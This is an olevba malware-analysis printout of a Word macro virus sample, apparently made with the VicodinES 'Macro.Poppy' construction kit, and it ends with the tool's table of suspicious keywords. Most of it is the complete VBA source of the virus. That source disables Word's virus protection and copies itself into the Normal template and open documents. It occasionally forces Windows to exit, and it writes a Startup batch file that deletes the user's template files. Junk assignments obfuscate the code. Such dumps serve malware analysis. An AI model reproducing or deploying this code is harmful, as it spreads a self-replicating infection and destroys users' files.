olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-8c1dea9cc6a75662423363e0cfa403f5263cef99
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-8c1dea9cc6a75662423363e0cfa403f5263cef99 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO iranorthdown.bas 
in file: Virus.MSWord.VMPC-based-8c1dea9cc6a75662423363e0cfa403f5263cef99 - OLE stream: 'Macros/VBA/iranorthdown'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub iranorthdown()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Loveless, all"
    'Poppy ID : 555535372018
    
    
On Error Resume Next
Randomize
f11216 = u2681 & c9920 & Int(Rnd * 4669)
f15561 = u2941 & c5501 & Int(Rnd * 4850)
f14049 = u10223 & c6665 & k9387 & m10223
k6857 = m11451 & e14069
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
k10944 = m14011 & e6916
k5166 = m12117 & e14121
ActiveDocument.ReadOnlyRecommended = False
k7573 = m15802 & e12345
k3295 = m5386 & e13285
k16636 = m17437 & e1928
check = Int(Rnd * 100)
If check = 3 Then Call p5064
f6657 = u16377 & c10014 & k9416 & m16377
f7812 = u4000 & c15144 & Int(Rnd * 6536)
f15203 = u17843 & c1798 & Int(Rnd * 294)
r3537555512 = 0
k10820 = m8926 & e7881
f12323 = u11462 & c3505 & Int(Rnd * 2897)
Set pp555535375 = MacroContainer
k13886 = m14653 & e12528
f10300 = u11790 & c17257 & Int(Rnd * 874)
f16311 = u6626 & c15381 & k13446 & m6626
f5038 = u10640 & c9016 & k3667 & m10640
 f8439$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f12442 = u9828 & c14739 & k10476 & m9828
e50645555 = GetAttr(NormalTemplate.FullName)
f12834 = u18418 & c10917 & Int(Rnd * 6514)
f4800 = u13908 & c6547 & Int(Rnd * 4304)
If e50645555 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8439$)
k11135 = m11869 & e3129
k17601 = m1959 & e8273
If e50645555 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f8439$)
f18215 = u7934 & c10394 & k14697 & m7934
f3420 = u14901 & c8019 & k7917 & m14901
If e50645555 = vbReadOnly Then GoTo fuckoff
f7526 = u8430 & c11129 & Int(Rnd * 2394)
If e50645555 = vbReadOnly + vbArchive Then GoTo fuckoff
k13322 = m11542 & e9213
f9085 = u9985 & c1511 & Int(Rnd * 945)
k8384 = m9084 & e13729
If pp555535375 = NormalTemplate Then r3537555512 = 1
If r3537555512 = 1 Then r4g35375 = NormalTemplate.FullName Else r4g35375 = ActiveDocument.FullName
k8013 = m3831 & e6628
f13299 = u6536 & c6784 & Int(Rnd * 175)
If r3537555512 = 1 Then nhy55559 = ActiveDocument.FullName Else nhy55559 = NormalTemplate.FullName
k6570 = m4665 & e14747
Application.OrganizerCopy Source:=r4g35375, Destination:=nhy55559, Name:="iranorthdown", Object:=wdOrganizerObjectProjectItems
f8335 = u6300 & c1629 & Int(Rnd * 3084)
k4106 = m8667 & e4670
If r3537555512 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If r3537555512 = 0 Then
f10538 = u8520 & c9727 & k9225 & m8520
     If NormalTemplate.Saved = False Then NormalTemplate.Save
f14454 = u14156 & c11915 & Int(Rnd * 8360)
k16540 = m8509 & e8821
     End If
f3824 = u8835 & c13267 & Int(Rnd * 3491)
k12444 = m15487 & e650
f8561 = u7686 & c15026 & k10667 & m7686
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "IRA-NorthDown", vbInformation
k9072 = m7280 & e16078
End Sub
Sub FileNew()
    On Error Resume Next
f8050 = u10730 & c7613 & Int(Rnd * 4158)
    Call iranorthdown
f15156 = u9005 & c10251 & Int(Rnd * 6410)
f7645 = u6796 & c12364 & k13694 & m6796
Dialogs(wdDialogFileNew).Show
f6943 = u11947 & c4029 & k4918 & m11947
    Skip = 1
f10074 = u10403 & c3861 & Int(Rnd * 1211)
    Call iranorthdown
k15041 = m7032 & e5087
End Sub
Sub ToolsMacro()
    On Error Resume Next
f12907 = u7946 & c10605 & Int(Rnd * 9695)
k14850 = m9174 & e18873
    Call iranorthdown
f9550 = u18102 & c7376 & k14945 & m18102
f5324 = u16208 & c13030 & k9168 & m16208
f5907 = u12692 & c10132 & Int(Rnd * 6418)
f16823 = u13581 & c12793 & Int(Rnd * 6269)
f6073 = u9896 & c12912 & Int(Rnd * 206)
f6896 = u3109 & c12482 & Int(Rnd * 6684)
End Sub
Sub FileTemplates()
    On Error Resume Next
k11107 = m15712 & e7202
    Call iranorthdown
f11454 = u9410 & c12389 & k16197 & m9410
f13704 = u10471 & c12034 & k13418 & m10471
k12262 = m8091 & e9761
f4063 = u15566 & c5738 & k6227 & m15566
k4823 = m13018 & e2947
End Sub
Sub ViewVBCode()
    On Error Resume Next
f10811 = u8746 & c14670 & k17887 & m8746
f7348 = u15881 & c9278 & Int(Rnd * 6108)
    Call iranorthdown
f12085 = u14731 & c11036 & k7669 & m14731
k11941 = m4233 & e14307
End Sub
Sub p5064()
    On Error Resume Next
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Tasks.ExitWindows
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
k9009 = m14052 & e4020
n$ = NormalTemplate
f14232 = u10117 & c13141 & Int(Rnd * 9270)
k15790 = m7085 & e4412
Part11$ = "attrib -h -r "
k10632 = m10613 & e16786
k6602 = m10365 & e5795
snag$ = "c:\progra~1\micros~1\templa~1\"
f5103 = u12168 & c4258 & k5915 & m12168
snag1$ = "c:\progra~1\micros~2\templa~1\"
f9495 = u1268 & c11383 & Int(Rnd * 4533)
f8984 = u14310 & c3971 & k5724 & m14310
Part2$ = "del "
f6138 = u11424 & c8153 & Int(Rnd * 43)
k10041 = m11345 & e17544
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
f4306 = u9644 & c12830 & Int(Rnd * 2452)
k4856 = m8719 & e13993
f14472 = u6848 & c15610 & k14444 & m6848
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
|Hex String|UU57                |55553537                                     |
+----------+--------------------+---------------------------------------------+

